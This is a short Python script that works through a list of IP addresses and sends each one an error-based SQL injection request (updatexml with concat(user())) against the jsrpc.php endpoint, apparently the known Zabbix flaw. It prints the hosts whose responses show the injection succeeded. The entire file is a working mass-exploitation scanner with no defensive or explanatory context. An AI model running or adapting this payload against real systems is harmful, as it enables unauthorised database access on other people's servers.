import requests

with open('out.txt', 'r') as f:
	for ip in f.readlines():
		url = 'http://' + ip.strip() + '/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)'
		print(url)
		try:
			resp = requests.get(url, proxies={'http':'http://127.0.0.1:8080'}, timeout=5)
			if 'INSERT INTO' in resp.text:
				print(url+'*'*20)
		except:
			pass